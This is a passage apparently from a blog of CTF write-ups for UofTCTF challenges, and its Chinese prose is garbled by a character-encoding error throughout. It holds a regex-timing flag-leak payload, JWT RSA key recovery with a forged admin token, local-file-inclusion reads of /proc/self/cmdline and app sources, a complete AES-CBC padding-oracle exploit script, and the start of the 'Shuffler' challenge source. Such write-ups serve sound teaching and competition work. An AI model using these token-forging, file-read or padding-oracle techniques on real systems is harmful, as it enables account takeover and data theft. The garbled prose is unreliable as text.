<p>å¤§æ¦‚æœƒé•·é€™æ¨£å» leakï¼Œä½†ä¸çŸ¥é“ç‚ºä»€éº¼è³½ä¸­æœ€å¤šåª leak åˆ° <code>uoftctf&#123;why_15_my_4pp_l4661n6_</code>ï¼Œå¾Œé¢å°±ä¸è¦‹<br><strong>æ›´æ–°ï¼šçŸ¥é“äº†ï¼Œå› ç‚ºæœ€å¾Œå¹¾å€‹(.*)çš„éƒ¨åˆ†æœƒå› ç‚ºå­—æ•¸ä¸è¶³è‡ªå‹•å¿½ç•¥</strong><br>è¨˜éŒ„ä¸‹çœ‹åˆ°çš„å¦ä¸€ç¨® payload<br><code>/(^uoftctf\&#123;w.*$)|(^u(.*?)*o(.*?)*f(.*?)*t(.*?)*c(.*?)*t(.*?)*f(.*?)*\&#123;(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*~$)/</code>ï¼Œåéä¾†ï¼ŒåŒ¹é…æ­£ç¢ºçš„æ™‚å€™æœƒç‰¹åˆ¥å¿«ï¼Œç„¶å¾Œæ˜¯èƒ½éå¾—(ç–‘)  </p>
<h3 id="1337-v4ul7"><a href="#1337-v4ul7" class="headerlink" title="1337 v4ul7"></a>1337 v4ul7</h3><p>ä¸€é“ web é»‘ç®±é¡Œï¼Œè¼¸å…¥åå­—å¾Œæœƒç”¢ç”Ÿä¸€å€‹ JWT ç¶“ RS256 ç°½ç« éçš„ Tokenï¼Œåœ¨å·²çŸ¥ e çš„æƒ…æ³ä¸‹æ±‚å– n æœƒè®Šæˆä¸€å€‹ linear equationï¼Œæ‰€ä»¥å…ˆè²è«‹å…©çµ„æŠŠå…¬é‘°ç®—å‡ºä¾†ï¼š<br>ä½¿ç”¨ç¾æˆå·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/FlorianPicca/JWT-Key-Recovery">https://github.com/FlorianPicca/JWT-Key-Recovery</a>  </p>
<p>ä¸€é–‹å§‹ä»¥ e&#x3D; 65537 ç„¡æ³•ç®—å‡ºä¾†ï¼Œçœ‹é¡Œç›®åç¨±çŒœè§£ e&#x3D;1337 (é€™æ­¥é©Ÿå¯ä»¥ç”¨çˆ†ç ´çš„)<br>ä½†è³½å¾Œçœ‹åˆ°æœ‰äº›éšŠä¼è¢«é€™æ­¥å¡ LOL  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./recover.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRkbTFuYSIsImlhdCI6MTczNjYwMTA3Nn0.CRXgMlBAdFyM8bULieaihYmGDwJUEjigNgEKM89mUcIG9xDayZGBSnOZnsDkGHa0U2B9Odh977LYCovjXqd3_vpVNCRAVVPv_CWZxowKq8DdMGARxMjfbDgoBaqDp09cAOzsm4xr47Q_2dxBsywKe7QFeIS7NaeKMv6bUQYKxujUnaE7gHAedsMP4O8jKb_V6KSgUoJaklcQlW7ZivCdzT0zdTp1LHWkTLzyCFNkuR9HWzaLi9dEyxH_Thy7hzhLImRgzoJL_OOb-D-ekHgk65FGkPgWrJh-OIycBLe_Zu6HoMFHSj70k1lm5j3JGf-vtxix8ppWkKi5BaiDlyoPWw eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRkbTFuYSIsImlhdCI6MTczNjYwMTA4OH0.Xmt6AARDLE-JyDhiP8xo-4tipA7dbHxqIfPP845BreiLF704iBeSLMgEQcF5L0ITgpfyscM9TEWRKjvb039VB97TfN7HgUkOmOOd9qpdSJvQWK4x3EsyTJnF26C3g7B5ZuUD-c5u0G11yRU5uGXAwdeR3SFKCACMEU11ZV7c_-X4iZtzk_F_JvJ9Vpgf8pF8Iz8i3PEgA5s4NcE8htJMVXD1cKyBs-M2UilJhh0bT1UBl6qGBHyIOjLguzaEVyN0XdUa1-uDLcObbwkktplr3DXmcoQ9Fvof4PoH_An2KG6EG90bj1kRtGElPxKNaeYJMFB9LgE57NszOZhcUR6kNg -e 1337</span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ° n çš„å€¼ä»¥å¾Œç”¨ factordb æŸ¥ï¼Œé©šè¨åœ°ï¼ŒæŸ¥åˆ°äº†<br><a target="_blank" rel="noopener" href="https://factordb.com/index.php?query=22338831384622741095512784770300218608833885382469031992367353904096810036260622322224145755137143197626937176452042548581271094378965651098622962399031093501604856859467295727316504126100218007744328344668751006936360939412296505723796663493368457939171289221211455912756822624084761748086012445890852541765670206755919673621617562673378602825173889015243303875577991083906583920127169035623965349092643874096468166878174025294449884237130600563448754975493134926874415598720316110413802580885962139822677139031922753498284764317654499269040191426780232138970518764882583557462490015760706517348699669298575354009263">https://factordb.com/index.php?query=22338831...</a>  </p>
<p>æ¥ä¸‹ä¾†ç”Ÿæˆç§é‘°ï¼š  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line">p=<span class="number">133484690592026186010860192574898984298222251732925137610117465412963650557521008076227165794297767516123393324271303490723544547350430683180536267607513833975431610470682380246648970069032564239920998973568747372231787302645291647076689658546226314236588333014934173055006561600431592162938720622827437834353</span></span><br><span class="line">q=<span class="number">167351261673128296009566296072270010432034560428469285438034336781796617783406454468303526986165053458909796709931434581215576253681224557433266457048048741168743667266561931813391517805697301227414374743801620622546225713183008225315674891115964093872136831500798720839019132851721441325450098729852566493471</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">1337</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line">key = RSA.construct((n, e, d, p, q))</span><br><span class="line"></span><br><span class="line">private_key_pem = key.export_key()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;private.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(private_key_pem)</span><br></pre></td></tr></table></figure>

<p>ç°½ä¸€å€‹ token å›å» (python2 çš„ pyjwt)  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;private.pem&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private_key = f.read()</span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;4dm1n&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1756601712</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(payload, private_key, algorithm=<span class="string">&quot;RS256&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;JWT Token:&quot;</span>, token)</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹ä¾†ç™»å…¥ç¶²ç«™æœƒçœ‹åˆ°æ–‡ä»¶è®€å–çš„åŠŸèƒ½ï¼Œæœ‰ LFIï¼Œç¶“éè®€å– <code>/proc/self/cmdline</code> å¾—åˆ°æª”å <code>5up3r_53cur3_50urc3_c0d3.js</code>ï¼Œcode review å¾Œæ‰¾åˆ° <code>secret-flag</code> é€™å€‹ package<br>è®€å– <code>/usr/src/app/node_modules/secret-flag/index.js</code> å°±æ‹¿åˆ° flag ã„Œ  </p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Enchanted-Oracle"><a href="#Enchanted-Oracle" class="headerlink" title="Enchanted Oracle"></a>Enchanted Oracle</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the AES-CBC oracle!&quot;</span>)</span><br><span class="line">key = <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Do you want to encrypt the flag or decrypt a message?&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1. Encrypt the flag&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2. Decrypt a message&quot;</span>)</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        cipher = AES.new(key=key, mode=AES.MODE_CBC)</span><br><span class="line">        ciphertext = cipher.iv + \</span><br><span class="line">            cipher.encrypt(pad(<span class="string">b&quot;random&quot;</span>, cipher.block_size))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b64encode(ciphertext).decode()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        line = <span class="built_in">input</span>().strip()</span><br><span class="line">        data = b64decode(line)</span><br><span class="line">        iv, ciphertext = data[:<span class="number">16</span>], data[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=key, mode=AES.MODE_CBC, iv=iv)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            plaintext = unpad(cipher.decrypt(ciphertext),</span><br><span class="line">                              cipher.block_size).decode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> plaintext == <span class="string">&quot;I am an authenticated admin, please give me the flag&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Victory! Your flag:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Unknown command!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç¶“å…¸é¡Œï¼ŒCBC æœ‰ Padding Error æç¤ºï¼Œè¦æ§åˆ¶è§£å¯†çµæœï¼š<br><img src="https://hackmd.io/_uploads/SJpsZ4zPJg.png" alt="image">  </p>
<p>å›é¡§ä¸‹åŠ å¯†æµç¨‹å’Œ Padding Oracle æ‰‹æ³•ï¼Œå¦‚æœéƒ½èƒ½ç¿»æˆæ­£ç¢ºçš„ Padding æ ¼å¼è‡ªç„¶ä¹Ÿèƒ½å†é€éxorç¿»å‡ºæƒ³è¦çš„å­—å…ƒ<br>æ¯æ¬¡çš„æµç¨‹è®Šæˆï¼š<br>è¨‚è£½ä¸‹ä¸€å¡Š block è¦è¢«è§£å¯†æˆæ­£ç¢ºæ–‡å­—çš„ IV -&gt; é€é Padding Oracle è§£å¯†å‰›å‰›çš„ IV ä¸¦åˆ¶å®šæ–°çš„ IV<br>é‡è¤‡ä¸‰æ¬¡å°±å¯ä»¥æŠŠç›®æ¨™å­—ä¸²æ‹¼å‡ºä¾†äº†  </p>
<p>ä¸Šè…³æœ¬ï¼š  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Oracle</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">data</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendline(b64encode(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Error!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding Oracle</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc</span>):</span><br><span class="line">    flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">0</span>, <span class="built_in">len</span>(enc)-<span class="number">16</span>, <span class="number">16</span>): <span class="comment"># Enumerate Every Blocks</span></span><br><span class="line">        iv, msg=enc[i:i+<span class="number">16</span>], enc[i+<span class="number">16</span>:i+<span class="number">32</span>]</span><br><span class="line">        cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">16</span>):</span><br><span class="line">            now=<span class="number">15</span>-j <span class="comment"># Finding C[now]</span></span><br><span class="line">            candi=[]</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> oracle(iv[:now]+<span class="built_in">bytes</span>([k])+xor(cur, <span class="built_in">bytes</span>([j+<span class="number">1</span>]*j), iv[<span class="number">16</span>-j:])+msg):</span><br><span class="line">                    candi.append(xor(k, iv[now], j+<span class="number">1</span>))</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(candi)==<span class="number">2</span> <span class="keyword">and</span> candi[<span class="number">0</span>]==<span class="built_in">bytes</span>([j+<span class="number">1</span>]):</span><br><span class="line">                cur=candi[<span class="number">1</span>]+cur</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur=candi[<span class="number">0</span>]+cur</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Current: <span class="subst">&#123;cur&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        flag+=cur</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">target=pad(<span class="string">b&#x27;I am an authenticated admin, please give me the flag&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">known=b64decode(r.recvline())</span><br><span class="line">payload=xor(target[-<span class="number">16</span>:], <span class="string">b&#x27;random\n\n\n\n\n\n\n\n\n\n&#x27;</span>, known[:<span class="number">16</span>])+known[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">cur_iv, cur_enc = <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>, payload[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">0</span>, -<span class="number">16</span>):</span><br><span class="line">    cur_block=decrypt(cur_iv+cur_enc)</span><br><span class="line">    cur_iv=xor(target[i-<span class="number">16</span>:i], cur_block, cur_iv)</span><br><span class="line">    payload=cur_iv+payload</span><br><span class="line">    cur_enc=cur_iv</span><br><span class="line">    cur_iv=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(b64encode(payload))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>æœ‰è¶£çš„æ˜¯å› ç‚º flag å¤ªé•·ï¼Œæˆ‘é€™é‚Šæ‰“ä¸€æ‰“å°±æœƒ timeout æ‰€ä»¥æœ€å¾Œç›´æ¥ä¸Ÿçµ¦ä¸»è¾¦å¹«æˆ‘è·‘ w<br><img src="https://hackmd.io/_uploads/HJlxXVzPyg.png" alt="image">  </p>
<h3 id="Shuffler"><a href="#Shuffler" class="headerlink" title="Shuffler"></a>Shuffler</h3><p>ä¸€å€‹ç†è«–ä¸Šæ‡‰è©²éš¨æ©Ÿçš„æ´—ç‰Œç¨‹å¼ï¼Œè¦æ±‚æ¨ç®—å‡ºåˆå§‹çš„éš¨æ©Ÿå€¼  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/local/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Bake</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">if</span> y &lt;= <span class="number">1</span> / <span class="number">2</span>:</span><br><span class="line">        x, y = x / <span class="number">2</span>, <span class="number">2</span> * y</span><br><span class="line">    <span class="keyword">elif</span> y &gt;= <span class="number">1</span> / <span class="number">2</span>:</span><br><span class="line">        x, y = <span class="number">1</span> - x / <span class="number">2</span>, <span class="number">2</span> - <span class="number">2</span> * y</span><br><span class="line">    <span class="keyword">return</span> x,y </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, initial_state</span>):</span><br><span class="line">        self.x = initial_state[<span class="number">0</span>]</span><br><span class="line">        self.y = initial_state[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        num = self.x + self.y</span><br><span class="line">        self.x, self.y = Bake(self.x, self.y)</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">random_number</span>(<span class="params">self, n=<span class="number">1</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(self.<span class="built_in">next</span>()*n/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Arrangement</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, n</span>):</span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.nums = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>)]</span><br><span class="line">        self.shuffle(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">shuffle</span>(<span class="params">self, n</span>):</span><br><span class="line">        new_nums = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num_index = self.seed % (n - i)</span><br><span class="line">            new_nums.append(self.nums.pop(num_index))</span><br><span class="line">            self.seed //= (n - i)</span><br><span class="line">        self.nums = new_nums</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = <span class="string">b&#x27;uoftctf&#123;...&#125;&#x27;</span></span><br><span class="line">    initial_x = Fraction(<span class="string">&#x27;...&#x27;</span>)</span><br><span class="line">    initial_y = Fraction(<span class="string">&#x27;...&#x27;</span>) </span><br><span class="line">    k = <span class="built_in">int</span>(<span class="string">&#x27;...&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;initial_y &lt; <span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span> &lt; initial_x &lt; <span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span> &lt; k &lt; <span class="number">100</span></span><br><span class="line">    y_hint1 = initial_y * Fraction(<span class="string">f&#x27;<span class="subst">&#123;<span class="number">2</span>**k - <span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="number">2</span>**k&#125;</span>&#x27;</span>) * (<span class="number">2</span> ** k)</span><br><span class="line">    x_hint1 = initial_x * Fraction(<span class="string">f&#x27;<span class="subst">&#123;<span class="number">2</span>**k - <span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="number">2</span>**k&#125;</span>&#x27;</span>) * (<span class="number">2</span> ** k)</span><br><span class="line">    <span class="keyword">assert</span> y_hint1.denominator == <span class="number">1</span> <span class="keyword">and</span> x_hint1.denominator == <span class="number">1</span></span><br><span class="line">    y_hint2 = <span class="built_in">int</span>(<span class="built_in">bin</span>(y_hint1.numerator)[:<span class="number">1</span>:-<span class="number">1</span>], <span class="number">2</span>)</span><br><span class="line">    x_hint2 = <span class="built_in">int</span>(<span class="built_in">bin</span>(x_hint1.numerator)[<span class="number">2</span>:], <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">assert</span> x_hint2 == y_hint2 * <span class="number">2</span></span><br><span class="line">    rng = PRNG((initial_x, initial_y))</span><br><span class="line">    key = sha256(long_to_bytes(rng.random_number(<span class="number">2</span>**<span class="number">100</span>))).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag = cipher.encrypt(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Welcome to the shuffler! Here&#x27;s the flag if you are here for it <span class="subst">&#123;flag.<span class="built_in">hex</span>()&#125;</span>.&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        bound = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me an upper bound for a sequence of numbers, I&#x27;ll shuffle it for you! &quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> bound &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Pick positive numbers!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> bound &gt; <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;That&#x27;s too much for me!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(Arrangement(rng.random_number(<span class="number">2</span>**<span class="number">100</span>), bound).nums)</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆé—œæ³¨è™•ç†æ´—ç‰Œçš„ç¨‹å¼ Arrangement  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Arrangement</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, n</span>):</span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.nums = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>)]</span><br><span class="line">        self.shuffle(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">shuffle</span>(<span class="params">self, n</span>):</span><br><span class="line">        new_nums = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num_index = self.seed % (n - i)</span><br><span class="line">            new_nums.append(self.nums.pop(num_index))</span><br><span class="line">            self.seed //= (n - i)</span><br><span class="line">        self.nums = new_nums</span><br></pre></td></tr></table></figure>
<p>æ•´å€‹æµç¨‹å°±æ˜¯å–æ¯æ¬¡ç•¶å‰ç¨®å­å°å‰©é¤˜ç‰Œæ•¸çš„é¤˜æ•¸ä½œç‚ºé€™æ¬¡è¦ pop æ‰çš„ index<br>æ¨¡æ“¬ä¸€éï¼Œå‡è¨­ä»Šå¤©æ•¸å­—æ˜¯ 87 ç„¶å¾Œæ´— 5 å¼µç‰Œï¼š  </p>
